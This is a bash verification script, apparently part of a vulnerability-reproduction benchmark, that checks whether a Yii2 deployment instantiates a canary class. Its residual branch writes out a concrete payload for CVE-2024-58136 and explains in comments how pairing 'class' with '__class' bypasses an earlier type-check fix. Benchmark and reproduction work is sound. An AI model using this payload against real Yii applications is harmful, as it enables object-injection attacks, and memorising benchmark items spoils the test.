#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0102, executor, flag_channel=X)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if [[ "$MODE" == "--seed" ]]; then
  # seed（既有行为，已通）：original_poc.py -> cand.json
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  # wrap non-JSON candidate into multi-field dict (file-based)
  "$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
else
  # residual: CVE-2024-58136（_heldout/bypass_poc.py 语义内嵌字面量，不引用 hidden 文件）。
  # V1(2.0.50) 的 CVE-2024-4990 类型检查只读 `class` 键（is_subclass_of(..., Behavior::class)），
  # 而 Yii::createObject() 优先按 `__class` 键实例化：class=合法 Behavior 子类(app\PcbLegitBehavior)
  # 通过检查，__class=app\PcbFlagProbe 实际被实例化 -> 构造器回显 canary（X 通道）。
  # V2(2.0.52) 先查 __class 再拒绝 -> 该分支在 V2 为负。flag 经 PCB_X=$RUN_FLAG 由 seed_exec 判定。
  CAND='{"id": "residual___class_nested", "config": "{\"as pcb\": {\"class\": \"app\\\\PcbLegitBehavior\", \"__class\": \"app\\\\PcbFlagProbe\"}}"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
fi
export PCB_X="$RUN_FLAG"
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "${_CP:-8080}" 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == '$RUN_FLAG' else 10)" "$OUT"
